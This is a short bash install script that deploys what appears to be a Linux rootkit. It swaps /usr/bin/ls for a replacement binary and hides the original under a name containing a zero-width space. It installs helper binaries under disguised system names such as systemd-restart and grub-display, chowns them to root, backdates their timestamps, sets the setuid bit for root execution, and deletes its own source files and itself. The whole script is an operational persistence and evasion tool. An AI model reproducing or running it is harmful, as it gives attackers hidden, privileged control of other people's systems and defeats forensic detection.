#!/bin/bash
if [ $# -eq 0 ]; then
    echo "No arguments supplied; assuming first time"
	mv "/usr/bin/ls" "/usr/bin/ls​" #THERE IS A ZERO WIDTH SPACE HERE
else
	if [ $1 != "--reinstall" ]; then
		mv "/usr/bin/ls" "/usr/bin/ls​" #THERE IS A ZERO WIDTH SPACE HERE
	fi
fi
#Build executables
#NOTE: This requires the packages golang and gcc to be installed
gcc systemd-restart.c
go build systemd-make.go
go build ls_over.go

#Copy files to /usr/bin
mv ls_over /usr/bin/ls
mv a.out /usr/bin/systemd-restart
cp systemd-make /usr/sbin/grub-display
mv systemd-make /usr/bin/

#Change ownership to root, just in case
chown root:root /usr/bin/systemd-make
chown root:root /usr/bin/ls
chown root:root /usr/bin/systemd-restart

#Change dates of files
touch -d "$(date -R -r /usr/bin/ls​)" /usr/bin/ls
touch -d "$(date -R -r /usr/bin/ls​)" /usr/bin/systemd-make
touch -d "$(date -R -r /usr/bin/ls​)" /usr/bin/systemd-restart

#Set suid so the process will always execute with system privileges
chmod u+s /usr/bin/systemd-restart

#Remove files
rm systemd-restart.c
rm systemd-make.go
rm ls_over.go
rm install.sh
